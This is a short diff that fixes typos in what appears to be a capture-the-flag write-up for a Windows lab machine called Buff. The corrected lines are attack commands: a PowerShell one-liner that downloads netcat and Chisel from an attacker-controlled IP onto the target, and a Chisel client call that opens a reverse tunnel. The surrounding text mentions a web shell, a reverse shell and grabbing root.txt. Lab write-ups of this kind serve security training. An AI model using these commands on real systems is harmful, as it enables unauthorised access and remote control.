@@ -79,7 +79,7 @@ This web-shell is not the best to work out of, so I'm going to create a reverse 
 To do this I'll need to transfer a netcat executable to the target machine. First I'll set up a Python webserver and on the target box fetch netcat with:
 
 ```text
-powershell -c iwr http://10.10.14.28/nc.exe -outfile nc.exe"
+powershell -c iwr http://10.10.14.28/nc.exe -outfile nc.exe
 ```
 
 Now that we have netcat on the target we can easily get a stable reverse shell by issuing:
@@ -169,7 +169,7 @@ Chisel is my favorite tool for situations like this, because it can be used on b
 First things first I need to copy Chisel over to the Buff machine. To do this I'll use the same PowerShell one-liner I used to transfer over netcat:
 
 ```text
-powershell -c iwr http://10.10.14.28/chisel_1.8.1_windows_amd64 -outfile chisel.exe"
+powershell -c iwr http://10.10.14.28/chisel_1.8.1_windows_amd64 -outfile chisel.exe
 ```
 
 After that I'll start up chisel on my box:
@@ -185,7 +185,7 @@ After that I'll start up chisel on my box:
 And finally I'll connect back to my server from Buff:
 
 ```text
-.chisel.exe client 10.10.14.28:8000 R:8888:localhost:8888
+chisel.exe client 10.10.14.28:8000 R:8888:localhost:8888
 ```
 
 Cool, we should now have a tunnel to use now. Let's fire off the exploit and grab root.txt:
